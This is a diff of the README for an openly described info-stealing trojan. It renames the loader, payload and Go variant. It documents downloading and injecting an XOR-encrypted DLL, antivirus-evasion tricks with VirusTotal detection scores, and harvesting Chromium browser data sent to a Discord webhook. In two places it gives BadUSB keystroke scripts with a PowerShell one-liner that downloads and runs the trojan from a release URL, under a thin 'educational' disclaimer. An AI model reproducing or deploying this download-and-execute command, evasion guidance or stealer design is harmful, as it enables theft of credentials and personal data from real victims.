@@ -4,10 +4,10 @@ ADR is a trojan that retrieves all information on the computer and all data stor
 
 > ⚠️ This project has a strictly educational objective. It aims to provide information, advice and resources in an educational context. I want to emphasize that I do not support or encourage any malicious or damaging use of this information. Any negative or abusive interpretation goes against the educational intent of this project. As the creator of this content, I accept no responsibility for any misuse that may arise from its use.
 
-## bADR (EXE)
+## loader (EXE)
 
-bADR is the entry program that will load ADR (the DLL that contains the malware).
-bADR downloads the DLL online, this DLL is encrypted in XOR so as not to be detected by the antivirus. The DLL is then decoded and then injected into the memory of the process to execute the "main" function.
+The loader is the entry program that will load ADR (the DLL that contains the malware).
+The loader downloads the DLL online, this DLL is encrypted in XOR so as not to be detected by the antivirus. The DLL is then decoded and then injected into the memory of the process to execute the "main" function.
 
 * download the DLL encode in XOR
 * decode the XOR
@@ -15,16 +15,16 @@ bADR downloads the DLL online, this DLL is encrypted in XOR so as not to be dete
 * execution of the "main" function of the ADR malware
 
 
-bADR uses a few tricks to avoid being detected by anti-viruses, in particular:
+The loader uses a few tricks to avoid being detected by anti-viruses, in particular:
 
 * hiding suspicious functions using LoadLibrary and GetProcAddress (so imports are hidden and not visible in the executable)
 * the masking of character strings, the url at which the payload is located, encrypt in XOR so as not to be readable in the executable directly
 * optimization of compiler parameters and compression with UPX
 * to make it possible to hide the imports even more, if we do not have an executable heavier in KB, we can change the Runtime Library. Indeed, switching from Multi-threaded DLL mode (/MD) to Multi-threaded mode (/MT) hides all imports (with UPX). However, it takes about 40 KB more than the Multi-threaded DLL version.
 
-## ADR (DLL)
+## payload (DLL/XOR)
 
-ADR is compiled in DLL, encoded in XOR, then uploaded to a server to be loaded later by bADR. 
+The payload is compiled in DLL, encoded in XOR, then uploaded to a server to be loaded later by the loader. 
 the main function is the entry point of the malware, this function aims to:
 
 * scan Windows AppData folder for folder using Chromium file structure
@@ -40,13 +40,13 @@ the main function is the entry point of the malware, this function aims to:
     * Machine Name
 * all this data is then compressed into a Zip file which will be sent to a discord webhook (obviously this data can be sent to any public server or webhook).
 
-## gADR (EXE)
+## go (EXE)
 
-gADR is the Golang version of bADR. With this version we reached the score of 4/71 detection on virustotal. This results and largely due to the obfuscator: garble, which allowed this incredible result. The golang code does not change much from the C version, loading the DLL into memory reuses the C code from bADR and is compiled with CGO.
+go loader is the Golang version of the loader. With this version we reached the score of 4/71 detection on virustotal. This results and largely due to the obfuscator: garble, which allowed this incredible result. The golang code does not change much from the C version, loading the DLL into memory reuses the C code from the loader and is compiled with CGO.
 
 > why no compression with UPX?
 
-gARD will not decompress with UPX because it is much more detectable with compression enabled. The gADR.exe pyaload is therefore heavier (5 MB).
+gARD will not decompress with UPX because it is much more detectable with compression enabled. The goloader.exe pyaload is therefore heavier (5 MB).
 
 > Compile with Garble
 
@@ -59,21 +59,21 @@ build.bat
 
 ### Anti Virus
 
-**bADR (EXE)**
+**loader (EXE)**
 
 *   ❔     Virustotal 6/70 
 *   ✅     Windows Defender, Chrome AntiVirus, Manalyzer
 
-**gADR (EXE)**
+**go (EXE)**
 
 *   ❔     Virustotal 4/70 
 *   ✅     Windows Defender, Chrome AntiVirus, Manalyzer
 
 
-**ADR (XOR)**
+**payload (XOR)**
 *   ✅     Virustotal, Windows Defender,  Chrome AntiVirus, Manalyzer
 
-**ADR (DLL)**
+**payload (DLL)**
 
 *   ❔     Virustotal 2/70 
 *   ❌  Windows Defender,  Chrome AntiVirus
@@ -82,12 +82,12 @@ build.bat
 
 ### UPX compression
 
-ADR and bADR files are compressed with UPX to reduce the size of the payload.
+ADR files are compressed with UPX to reduce the size of the payload.
 
 ```
-bADR.exe 15   ko => 10   ko  (Runtime Library Multi-threaded DLL /MD)
-bADR.exe 114  ko => 54   ko  (Runtime Library Multi-threaded /MT)
-ADR.dll  17  ko => 10.5  ko
+loader.exe 15   ko => 10   ko  (Runtime Library Multi-threaded DLL /MD)
+loader.exe 114  ko => 54   ko  (Runtime Library Multi-threaded /MT)
+payload.dll  17  ko => 10.5  ko
 ```
 
 ### Demo (v1, v2, v3)
@@ -113,7 +113,7 @@ __Digispark Rev.3 Kickstarter with Attiny85 and USB compatible with Arduino__
 DELAY 1000
 GUI r
 DELAY 200
-STRING powershell -command "(New-Object Net.WebClient).DownloadFile('https://github.com/julesgrc0/ADR/releases/download/0.0.3/bADR.exe','%userprofile%\bADR.exe');(New-Object -com shell.application).shellexecute('%userprofile%\bADR.exe');exit"
+STRING powershell -command "(New-Object Net.WebClient).DownloadFile('https://github.com/julesgrc0/ADR/releases/download/0.0.3/bADR.exe','%userprofile%\ADR.exe');(New-Object -com shell.application).shellexecute('%userprofile%\ADR.exe');exit"
 ENTER
 ```
 
@@ -141,7 +141,7 @@ void setup()
   Keyboard.releaseAll();
 
   delay(200);
-  Keyboard.print(F("powershell -command \"(New-Object Net.WebClient).DownloadFile('https://github.com/julesgrc0/ADR/releases/download/0.0.3/bADR.exe','%userprofile%\\bADR.exe');(New-Object -com shell.application).shellexecute('%userprofile%\\bADR.exe');exit\""));
+  Keyboard.print(F("powershell -command \"(New-Object Net.WebClient).DownloadFile('https://github.com/julesgrc0/ADR/releases/download/0.0.3/bADR.exe','%userprofile%\\ADR.exe');(New-Object -com shell.application).shellexecute('%userprofile%\\ADR.exe');exit\""));
 
   typeKey(KEY_RETURN);
 
